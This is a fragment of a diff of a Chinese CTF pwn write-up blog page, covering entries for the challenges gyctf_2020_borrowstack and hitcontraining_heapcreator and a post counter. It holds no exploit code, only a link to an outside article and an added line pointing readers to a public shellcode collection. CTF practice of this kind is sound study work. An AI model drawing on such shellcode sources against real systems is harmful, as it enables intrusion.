-<h2 id="63-gyctf-2020-borrowstack"><a href="#63-gyctf-2020-borrowstack" class="headerlink" title="63 gyctf_2020_borrowstack"></a>63 gyctf_2020_borrowstack</h2><p>直接看<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">这篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>吧</p>
+<p>可以在<a class="link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>找一些合适的shellcode</p>
+<h2 id="63-gyctf-2020-borrowstack"><a href="#63-gyctf-2020-borrowstack" class="headerlink" title="63 gyctf_2020_borrowstack"></a>63 gyctf_2020_borrowstack</h2><p>直接看<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html" >这篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>吧</p>
 <h2 id="64-hitcontraining-heapcreator"><a href="#64-hitcontraining-heapcreator" class="headerlink" title="64 hitcontraining_heapcreator"></a>64 hitcontraining_heapcreator</h2><p>施工中</p>
 <h2 id="65"><a href="#65" class="headerlink" title="65"></a>65</h2>
 		</div>
@@ -1240,7 +1335,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 5 篇文章
+                        共撰写了 6 篇文章
                     </span>
                     
                 </p>
